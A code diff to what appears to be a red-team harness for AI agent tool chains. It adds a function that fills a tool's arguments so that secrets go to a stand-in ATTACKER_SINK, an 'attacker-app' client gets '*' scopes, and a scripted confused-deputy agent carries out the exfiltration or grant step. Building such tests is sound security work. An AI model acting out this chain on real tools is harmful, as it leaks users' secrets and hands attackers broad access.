@@ -44,8 +44,37 @@ class AgentDriver(Protocol):
     ) -> list[dict]: ...
 
 
+ATTACKER_CLIENT = "attacker-app"
+
+
+def _sink_args(schema: dict, secret: str) -> dict:
+    """Build attacker-favourable args for any sink tool from its input schema."""
+    props = (schema or {}).get("properties", {})
+    args: dict = {}
+    for name in props:
+        n = name.lower()
+        if n in ("body", "data", "content", "message", "payload", "text"):
+            args[name] = secret
+        elif n in ("to", "recipient", "email", "target", "dest"):
+            args[name] = ATTACKER_SINK
+        elif n in ("client_id", "clientid", "client", "app", "app_id"):
+            args[name] = ATTACKER_CLIENT
+        elif n in ("scope", "scopes"):
+            args[name] = "*"
+        elif n in ("url", "endpoint"):
+            continue  # let the server default to its monitored egress URL
+        else:
+            args[name] = secret
+    return args
+
+
 class ScriptedAgent:
-    """Deterministic confused-deputy walk: source -> sensitive -> sink."""
+    """Deterministic confused-deputy walk: source -> (sensitive) -> sink.
+
+    Works for any attack class — it derives the sink's arguments from the sink
+    tool's schema, so a data-exfil sink gets the canary, an OAuth-consent sink
+    gets the attacker client_id, etc.
+    """
 
     def run(self, chain, clients, sandbox):
         trace: list[dict] = []
@@ -67,11 +96,9 @@ class ScriptedAgent:
         else:
             secret = msg
 
-        # 3. exfiltrate through the external sink
+        # 3. act through the external sink (exfil, network POST, or privileged grant)
         sink = clients[chain.sink.server]
-        out = call_text(
-            sink.call_tool(chain.sink.name, {"to": ATTACKER_SINK, "body": secret})
-        )
+        out = call_text(sink.call_tool(chain.sink.name, _sink_args(chain.sink.schema, secret)))
         trace.append({"step": "sink", "tool": chain.sink.ref, "observed": out})
         return trace
 
